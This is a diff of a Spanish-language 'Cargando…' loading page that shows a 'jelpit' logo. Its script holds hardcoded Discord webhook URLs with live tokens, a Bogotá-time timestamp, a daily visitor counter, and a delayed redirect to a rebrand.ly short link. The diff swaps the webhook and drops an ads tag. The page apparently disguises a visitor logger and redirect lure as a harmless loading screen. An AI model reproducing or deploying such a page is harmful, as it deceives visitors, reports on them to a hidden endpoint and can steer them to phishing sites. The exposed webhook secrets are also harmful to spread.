@@ -4,59 +4,18 @@
 <meta charset="UTF-8">
 <title>Cargando…</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
-
-  <!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=AW-18426798636"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'AW-18426798636');
-</script>
 <style>
-  html,body{margin:0;height:100%;background:#fff;font-family:Arial,sans-serif;overflow:hidden}
-  #loader{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;flex-direction:column;background:#fff;z-index:9999;padding:20px;box-sizing:border-box}
-  #loader img{
-    width:min(320px, 78vw);
-    max-width:100%;
-    height:auto;
-    display:block;
-    animation: bounceGlow 2.4s ease-in-out infinite;
-    transform-origin:center;
-    filter: drop-shadow(0 8px 22px rgba(0,0,0,.14));
-  }
-  #loader span{margin-top:14px;color:#222;font-size:clamp(14px,2.2vw,18px);font-weight:600;letter-spacing:0.3px;text-align:center}
-  @keyframes bounceGlow{
-    0%,100%{transform:translateY(0) scale(1) rotate(0deg)}
-    25%{transform:translateY(-6px) scale(1.03) rotate(-2deg)}
-    50%{transform:translateY(0) scale(1.08) rotate(0deg)}
-    75%{transform:translateY(-3px) scale(1.04) rotate(2deg)}
-  }
-  @media (max-width:600px){
-    #loader{padding:16px}
-    #loader img{width:min(220px, 84vw)}
-  }
-  @media (max-width:400px){
-    #loader img{width:min(180px, 86vw)}
-    #loader span{font-size:13px}
-  }
-  @media (orientation: landscape) and (max-height:500px){
-    #loader img{width:min(180px, 42vh)}
-  }
+  html,body{margin:0;height:100%;display:flex;align-items:center;justify-content:center;background:#fff}
+  #loader{width:120px;height:120px}
 </style>
 </head>
 <body>
-  <div id="loader" style="display:none">
-    
-  </div>
+
+<img id="loader" src="logo00-jelpit.jpg" alt="Cargando…">
 
 <script>
-setTimeout(() => {
-  document.getElementById('loader').style.display = 'flex';
-}, 5500);
 /* ========= CONFIG ========= */
-const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1542299578689265786/ZqnsQpz92nQlidgO6OjohIVbYw-RCsVreEsZLjiUpTr-yoqSWgPLM0iH-aiwHRgvKJTU';
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1544680526877564959/hxiFw1ATTa7rIdGJddgXufxsr7LNvBLlJwSpXwcAhVitWaAZdUSJ8TuqBAs12GPQDWUu';
 const REDIR_URL   = 'https://rebrand.ly/zbwwhyc';
 /* ========================== */
 
@@ -114,7 +73,8 @@ const REDIR_URL   = 'https://rebrand.ly/zbwwhyc';
   /* ---------- FECHA / HORA ---------- */
   const ahora = new Date();
   const fechaHora = ahora.toLocaleString('es-CO', { timeZone: 'America/Bogota' });
-/* ---------- CONTADOR DIARIO ---------- */
+
+  /* ---------- CONTADOR DIARIO ---------- */
   const hoy = ahora.toISOString().slice(0, 10);
   const clave = `ingresos_${hoy}`;
   let num = parseInt(localStorage.getItem(clave) || '0', 10);
@@ -151,7 +111,7 @@ const REDIR_URL   = 'https://rebrand.ly/zbwwhyc';
   /* ---------- REDIRECCIÓN ---------- */
   setTimeout(() => {
     location.href = REDIR_URL;
-  }, 3000);
+  }, 4000);
 })();
 </script>
 </body>
